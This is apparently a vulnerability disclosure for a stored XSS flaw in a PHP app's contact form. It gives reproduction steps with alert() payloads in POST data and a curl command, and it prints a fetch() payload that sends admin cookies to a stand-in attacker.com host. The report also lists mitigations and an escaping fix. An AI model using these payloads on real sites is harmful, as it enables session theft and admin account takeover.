## ‚ö†Ô∏è Vulnerability Overview:

Stored Cross-Site Scripting (Stored XSS) is a security vulnerability where malicious scripts are permanently stored on the server (e.g., in a database). When another user‚Äîoften an administrator‚Äîviews the stored data, the script is executed in their browser.

In this case, **anyone can submit a contact us query form** through input fields. Since the inputs are **not sanitized or escaped**, an attacker can inject a malicious script into the request (e.g., `<script>alert('document.domain')</script>`). When an admin opens that query in the dashboard, the script executes in their browser, potentially leading to:

- Cookie theft  
- Session hijacking  
- Unwanted actions performed on behalf of the admin  

---

## Steps to Reproduce:

> ‚ö†Ô∏è **Note:** I downloaded the project source and hosted it on my Virtual Private Server (VPS) and located it on my domain name: `pentest1.blackm4c.xyz`.

1. **Open the Contact Us page and fill the form:**

    ```
    https://domain.com/contact.php
    ```

    ![Contact Us page](./images/support_page.png)

2. **Submit the form with XSS payloads using Burp Suite or browser developer tools.**  
   Payloads can be injected into:

    - Name  
    - Email  
    - Message  

    ![Burp Suite Repeater](./images/burp.png)

    Example POST payload:
    ```
    name=<script>alert("from+name+field")</script>&email=<script>alert("from+email+field")</script>&mobnum=123456789&message=<script>alert("from+message+field")</script>&submit=Submit
    ```

    Example `curl` command:
    ```bash
    curl -k -X POST 'https://domain.com/contact.php' \
    -b 'PHPSESSID=e9tr282kpesjphiav73rn8osm3' \
    --data 'name=<script>alert("from name")</script>&email=<script>alert("from email")</script>&mobnum=123456789&message=<script>alert("from message")</script>&submit=Submit'
    ```

3. **Log in to the admin account and navigate to the new Unread Queries:**

    Sidebar ‚Üí **DASHBOARD** ‚Üí **Total Unread Queries**

    ```
    https://domain.com/admin/unread-queries.php
    ```

    ![Dashboard page](./images/nav.png)

    After locating the infected query, click the **View** button:

    ![Query list](./images/nav2.png)  
    ![XSS trigger](./images/xss1.png)  
    ![XSS trigger](./images/xss2.png)  
    ![XSS trigger](./images/xss3.png)

    Demonstration of HTML injection:
    ![HTML trigger](./images/finalxss.png)

4. **Viewed queries are moved to the 'Total Read Queries' section:**

    Sidebar ‚Üí **DASHBOARD** ‚Üí **Total Read Queries**

    ![Navigation](./images/readmsg.png)

    Clicking again triggers the payload:

    ![XSS trigger](./images/readmsglist.png)

    The XSS payloads will execute via JavaScript `alert()` pop-ups for each infected field.

## Impact of Stored XSS

- An authenticated user can submit a query with malicious JavaScript in a form field.
- The input is **not sanitized or escaped**, and is stored in the backend (Database).
- When the **admin views the query**, the script executes in the admin's browser.
- This can lead to **admin account takeover** by stealing session cookies using payloads like:

    ```html
    <script>fetch('https://attacker.com?c=' + document.cookie)</script>
    ```

- The attacker can impersonate the admin and gain full system access.

---

## ‚úÖ Recommended Mitigations

The developer implemented `htmlspecialchars()` in some parts of the system, but missed doing so in `view-user-queries.php`.

- **Input Sanitization:**  
  Strip or escape HTML/JavaScript tags from user inputs before storing.

- **Output Encoding:**  
  Encode output data before rendering (e.g., use `htmlspecialchars()`).

- **Use Templating Engines That Auto-Escape Output:**
  - **Twig:** `{{ name }}` auto-escapes
  - **Blade (Laravel):** `{{ $name }}` auto-escapes

- **Content Security Policy (CSP):**  
  Add a strict CSP header to limit script execution.

- **HTTPOnly Cookies:**  
  Mark session cookies with `HttpOnly` to prevent JavaScript access.

- **Input Validation:**  
  Validate data format, type, and length on all user inputs.

## Code Fix

Ensure all echoed data is escaped:

```php
<!-- Before (vulnerable) -->
<td><?php echo $row['name']; ?></td>

<!-- After (secure) -->
<td><?php echo htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8'); ?></td>
```
Apply this change to all user-generated data displayed in view-user-queries.php.
